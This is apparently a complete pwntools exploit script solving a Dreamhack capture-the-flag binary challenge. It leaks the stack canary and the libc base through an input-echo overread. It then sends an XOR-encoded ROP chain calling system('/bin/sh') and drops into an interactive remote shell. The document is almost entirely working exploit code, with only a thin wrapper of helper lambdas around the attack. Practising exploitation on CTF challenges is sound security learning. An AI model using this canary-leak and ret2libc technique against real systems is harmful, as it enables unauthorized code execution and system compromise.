#!/usr/bin/python3 
from pwn import * 

exe = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x00000000000012BB
		c
		''')

HOST = "host8.dreamhack.games"
PORT = 11817

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

pld = b'12345678' * 3
sla(b'Input: ', pld)
ru(b'You entered: ')
ru(b'\x32')
canary = leak(r(8),0xa)
info("Canary : ", canary)
pld = b'12345678' * 5
sa(b'Input: ', pld)
ru(b'You entered: ')
ru(b'\x38')
libc.address = leak(r(6), 0x29d90)
info("Libc base: ", libc.address)

pop_rdi = libc.address + 0x2a3e5
pld = flat(
	b'\x00' * 0x18,
	canary,
	b'\x00' * 8,
	pop_rdi, 
	next(libc.search(b'/bin/sh')),
	pop_rdi + 1,
	libc.sym.system,
	)

size = len(pld)
temp = list(pld)
for x in range(size - 2, -1, -1):
	temp[x] = temp[x + 1] ^ temp[x]
pld = bytes(temp)
sa(b'Input: ', pld)
p.interactive()